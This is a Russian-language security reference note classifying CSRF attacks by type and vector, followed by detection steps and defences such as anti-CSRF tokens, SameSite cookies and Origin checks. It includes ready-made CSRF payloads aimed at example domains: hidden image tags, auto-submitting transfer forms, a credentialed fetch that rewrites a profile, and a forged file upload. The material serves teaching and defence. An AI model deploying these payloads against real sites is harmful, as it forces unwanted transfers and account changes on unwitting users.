---
aliases: [Типы CSRF атак, Векторы CSRF, Классификация CSRF]
tags: [security, web-security, csrf, types, vulnerabilities, attacks]
---

# Типы CSRF-атак

## Введение в CSRF-атаки

Cross-Site Request Forgery (CSRF) — это тип атаки, при котором злонамеренный сайт заставляет браузер пользователя выполнить нежелательное действие на доверенном сайте, где пользователь в настоящее время аутентифицирован. CSRF-атака возможна потому, что браузеры автоматически отправляют с каждым запросом аутентификационные данные (например, куки), независимо от того, откуда исходит запрос — с доверенного сайта или с вредоносного.

CSRF-атаки могут привести к серьезным последствиям:
- Нежелательные финансовые транзакции
- Изменение конфиденциальных настроек пользователя
- Выполнение административных действий
- Раскрытие чувствительной информации

Понимание различных типов CSRF-атак критически важно для разработчиков и специалистов по безопасности, так как это позволяет эффективно защищать веб-приложения от подобных угроз.

> [!tip] 
> CSRF-атаки особенно опасны тем, что они используют легитимные сессии пользователей, что затрудняет их обнаружение и предотвращение.

## Что такое CSRF и как она работает

CSRF (Cross-Site Request Forgery) — это атака, при которой злоумышленник заставляет браузер жертвы выполнить нежелательное действие на сайте, на котором пользователь уже аутентифицирован. Атака основывается на том, что браузер автоматически включает аутентификационные данные (например, сессионные куки) в каждый запрос, независимо от источника.

### Механизм работы CSRF

1. **Аутентификация пользователя**: пользователь аутентифицирован на доверенном сайте (например, банковский сайт)
2. **Посещение вредоносного сайта**: пользователь переходит на вредоносный сайт, не зная о его вредоносности
3. **Выполнение запроса**: вредоносный сайт заставляет браузер выполнить запрос к доверенному сайту
4. **Автоматическая аутентификация**: браузер включает сессионные куки в запрос, и доверенный сайт обрабатывает его как легитимный

### Пример простой CSRF-атаки

```html
<!-- Вредоносный сайт -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000" width="0" height="0">
```

Когда пользователь посещает вредоносный сайт, браузер автоматически отправляет запрос к банковскому сайту с аутентификационными куки, что может привести к нежелательному переводу средств.

## Основные типы CSRF-атак

### 1. GET-based CSRF-атаки

GET-based CSRF-атаки используют HTTP-метод GET для выполнения вредоносных действий. Эти атаки происходят, когда веб-приложение позволяет изменять состояние сервера через GET-запросы.

#### Особенности:
- Используются в URL-адресах
- Легко маскируются под изображения или ссылки
- Часто встречаются в устаревших приложениях

#### Пример:
```html
<img src="https://example.com/change-email?email=hacker@example.com" width="0" height="0">
```

### 2. POST-based CSRF-атаки

POST-based CSRF-атаки используют HTTP-метод POST для выполнения вредоносных действий. Это наиболее распространенный тип CSRF-атак, так как большинство чувствительных операций выполняются через POST-запросы.

#### Особенности:
- Требуют JavaScript или формы для выполнения
- Более сложны в реализации, чем GET-based атаки
- Часто маскируются под легитимные формы

#### Пример:
```html
<form action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Click me">
</form>
<script>
    document.forms[0].submit();
</script>
```

### 3. JSON-based CSRF-атаки

JSON-based CSRF-атаки используют AJAX-запросы с JSON-данными для выполнения вредоносных действий. Эти атаки возможны, когда приложение не проверяет заголовки и данные правильно.

#### Особенности:
- Используют XMLHttpRequest или fetch API
- Могут обходить простые проверки referer
- Требуют более сложной реализации защиты

#### Пример:
```javascript
fetch('https://api.example.com/settings', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        email: 'hacker@example.com'
    })
});
```

### 4. Multipart/form-data CSRF-атаки

Этот тип атак использует multipart/form-data для отправки данных через формы, что может обходить некоторые виды защиты.

#### Особенности:
- Используются для загрузки файлов и сложных форм
- Могут обходить простые проверки токенов
- Требуют специфической реализации защиты

## Примеры различных типов атак

### Пример GET-based CSRF-атаки: Изменение настроек

Представим, что сайт позволяет изменять email пользователя через GET-запрос:

```
GET /change-email?email=hacker%40example.com HTTP/1.1
Host: vulnerable-site.com
Cookie: sessionid=abc123
```

Вредоносный сайт может использовать:

```html
<img src="https://vulnerable-site.com/change-email?email=hacker%40example.com" width="0" height="0">
```

### Пример POST-based CSRF-атаки: Финансовая транзакция

Предположим, что банковский сайт позволяет переводить деньги через POST-запрос:

```html
<form action="https://bank.example.com/transfer" method="POST" id="transfer-form">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="5000">
</form>
<script>
    document.getElementById('transfer-form').submit();
</script>
```

### Пример JSON-based CSRF-атаки: Изменение профиля

Приложение позволяет изменять профиль через JSON-запрос:

```javascript
// Вредоносный скрипт
fetch('https://social-network.com/api/profile', {
    method: 'PUT',
    credentials: 'include', // Включает куки
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        bio: 'Check out this malicious site: http://hacker.com',
        website: 'http://hacker.com'
    })
});
```

### Пример Multipart CSRF-атаки: Изменение аватара

```html
<form action="https://profile-site.com/upload-avatar" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="user_id" value="12345">
    <input type="file" name="avatar" id="avatar" accept="image/*">
    <input type="submit" value="Upload">
</form>
<script>
    // Создаем фальшивый файл и отправляем форму
    const fileInput = document.getElementById('avatar');
    const file = new File(["fake image content"], "avatar.jpg", {type: "image/jpeg"});
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    fileInput.files = dataTransfer.files;
    
    document.forms[0].submit();
</script>
```

## Векторы эксплуатации

### 1. Внедрение через HTML-теги

Вредоносные запросы могут быть внедрены через различные HTML-теги:

#### Изображения (img)
```html
<img src="https://bank.com/transfer?to=hacker&amount=1000">
```

#### Фреймы (iframe)
```html
<iframe src="https://social.com/logout" style="display:none;"></iframe>
```

#### Скрипты (script)
```html
<script src="https://api.example.com/change-password?newpass=hacked"></script>
```

### 2. Внедрение через формы

Формы могут быть автоматически отправлены с помощью JavaScript:

```html
<form action="https://email.com/change" method="POST" id="csrf-form">
    <input type="hidden" name="new_email" value="hacker@example.com">
</form>
<script>
    document.getElementById('csrf-form').submit();
</script>
```

### 3. Внедрение через CSS

В редких случаях CSRF-атаки могут быть реализованы через CSS:

```css
div {
    background: url("https://api.example.com/action?param=value");
}
```

### 4. Внедрение через JSONP

JSONP-эндпоинты могут быть использованы для обхода Same-Origin Policy:

```html
<script>
    function jsonpCallback(data) {
        // Обработка данных
    }
</script>
<script src="https://api.example.com/data?callback=jsonpCallback"></script>
```

### 5. Внедрение через Flash или Silverlight

Хотя эти технологии устарели, они все еще могут быть векторами атаки:

```html
<object type="application/x-shockwave-flash" data="malicious.swf">
    <param name="flashvars" value="url=https://bank.com/transfer?to=hacker&amount=1000">
</object>
```

## Условия для успешной атаки

### 1. Аутентификация пользователя

Для успешной CSRF-атаки пользователь должен быть аутентифицирован на целевом сайте. Аутентификационные данные (куки, токены) должны автоматически отправляться с каждым запросом.

### 2. Отсутствие защиты

Целевое приложение не должно использовать защиту от CSRF, такую как:
- Anti-CSRF токены
- Проверка заголовка Origin
- Проверка заголовка Referer
- SameSite атрибут куки

### 3. Возможность выполнения запросов от имени пользователя

Вредоносный сайт должен иметь возможность выполнить запрос к целевому сайту от имени пользователя, что возможно благодаря:
- Same-Origin Policy не ограничивает исходящие запросы
- Автоматической отправке куки с каждым запросом

### 4. Предсказуемость параметров запроса

Параметры, необходимые для выполнения вредоносного действия, должны быть известны или предсказуемы:
- Имена полей форм
- Параметры URL
- Структура JSON-данных

### 5. Доверие к пользовательскому агенту

Сервер должен доверять пользовательскому агенту и не проверять происхождение запросов должным образом.

## Распознавание CSRF-уязвимостей

### 1. Анализ HTTP-методов

Проверьте, используются ли безопасные HTTP-методы:
- GET-запросы не должны изменять состояние
- POST/PUT/DELETE должны использоваться для изменений

### 2. Проверка наличия защиты

Проверьте, используется ли защита от CSRF:

#### В формах:
```html
<!-- Должен присутствовать скрытый CSRF-токен -->
<input type="hidden" name="csrf_token" value="...">
```

#### В заголовках:
```http
X-CSRF-Token: abc123...
```

### 3. Проверка аутентификационных данных

Определите, как приложение обрабатывает аутентификационные данные:
- Используются ли сессионные куки
- Какие данные автоматически отправляются с запросами

### 4. Анализ чувствительных операций

Определите операции, которые могут быть выполнены через CSRF:
- Финансовые транзакции
- Изменение профиля
- Изменение настроек
- Административные действия

### 5. Тестирование с помощью инструментов

Используйте инструменты для автоматического поиска CSRF-уязвимостей:
- OWASP ZAP
- Burp Suite
- CSRFTester

## Методы предотвращения для каждого типа

### Для GET-based CSRF

#### 1. Не использовать GET для изменений состояния
```javascript
// ПЛОХО: GET-запрос изменяет состояние
// GET /change-email?email=hacker@example.com

// ХОРОШО: Использовать POST/PUT для изменений
// PUT /user/email
// Body: { "email": "new@example.com" }
```

#### 2. Реализация CSRF-токенов
Даже для GET-запросов можно использовать токены в URL или заголовках.

### Для POST-based CSRF

#### 1. Anti-CSRF токены
```html
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="{{csrf_token}}">
    <!-- остальные поля формы -->
</form>
```

#### 2. Double Submit Cookie Pattern
Сервер устанавливает куки с токеном, а клиент должен отправить тот же токен в теле запроса или заголовке.

#### 3. SameSite атрибут куки
```http
Set-Cookie: sessionid=abc123; SameSite=Strict
```

### Для JSON-based CSRF

#### 1. Проверка Content-Type
Убедитесь, что JSON-запросы действительно отправляются с правильным Content-Type.

#### 2. Проверка Origin
Проверяйте заголовок Origin для AJAX-запросов.

#### 3. Использование CSRF-токенов в заголовках
```javascript
fetch('/api/action', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify(data)
});
```

### Для Multipart CSRF

#### 1. Специфическая проверка
Для multipart/form-data запросов могут потребоваться специфические проверки, так как стандартные методы могут не работать.

#### 2. Проверка файлов
Проверяйте содержимое загружаемых файлов на наличие вредоносного кода.

#### 3. Ограничение доступа
Ограничьте возможности, которые могут быть выполнены через multipart запросы.

### Общие методы предотвращения

#### 1. SameSite атрибут куки
Наиболее эффективная защита на стороне клиента:
- `SameSite=Strict`: куки отправляются только при прямом обращении к сайту
- `SameSite=Lax`: куки отправляются при навигации с других сайтов (но не при POST-запросах)

#### 2. Проверка Origin и Referer
Сервер может проверять происхождение запроса:
```javascript
// Пример проверки Origin
if (request.headers.origin !== expectedOrigin) {
    return res.status(403).send('Invalid origin');
}
```

#### 3. CAPTCHA для чувствительных операций
Для критически важных действий (например, переводы крупных сумм) можно использовать CAPTCHA.

#### 4. Подтверждение действий пользователем
Запрашивать дополнительное подтверждение для чувствительных операций.

#### 5. Ограничение времени жизни сессии
Короткие сессии уменьшают окно возможностей для CSRF-атак.

## Связанные файлы

- [[Анти-CSRF-токены]] - подробное описание токенов защиты от CSRF
- [[Double-Submit-Cookie]] - реализация паттерна двойной отправки куки
- [[SameSite-куки]] - использование атрибута SameSite для защиты
- [[Методы-защиты-от-CSRF]] - комплексный подход к защите от CSRF
- [[XSS-защита]] - защита от атак, которые могут обойти CSRF-защиту
- [[HTTP-Security-Headers]] - использование заголовков безопасности
- [[Content-Security-Policy]] - политика безопасности контента
- [[Управление-сессиями-и-аутентификацией]] - безопасное управление сессиями
- [[Безопасность-в-веб-приложениях-для-детей]] - специфические аспекты безопасности
- [[Тестирование-безопасности]] - методы тестирования на уязвимости
- [[Защита-от-инъекций]] - другие типы веб-уязвимостей
- [[Clickjacking-защита]] - защита от атак типа clickjacking
- [[Secure-Coding-Practices]] - лучшие практики безопасного программирования
- [[Ограничение-доступа-к-API]] - контроль доступа к API
- [[Безопасность-в-SPA]] - особенности безопасности в одностраничных приложениях
- [[Управление-доступом]] - системы управления доступом
- [[Безопасность-в-микросервисной-архитектуре]] - архитектурные аспекты безопасности
- [[Идентификация-и-отслеживание-угроз]] - обнаружение атак
- [[Мониторинг-безопасности-в-продакшене]] - мониторинг безопасности в продакшене
- [[Обнаружение-и-предотвращение-брутфорса]] - защита от перебора

## Заключение

CSRF-атаки остаются одной из наиболее распространенных угроз для веб-приложений. Понимание различных типов атак и векторов эксплуатации позволяет разработчикам эффективно защищать свои приложения. Ключ к надежной защите — это многоуровневый подход, включающий как технические меры (CSRF-токены, SameSite куки), так и организационные (обучение разработчиков, регулярное тестирование безопасности).

> [!important] 
> CSRF-защита должна быть реализована на всех уровнях приложения, от фронтенда до бэкенда, с учетом специфики каждого типа запроса и архитектурных решений.

Постоянное обновление знаний о новых методах атак и защиты, а также регулярное тестирование приложений на уязвимости — важные элементы поддержания безопасности веб-приложений.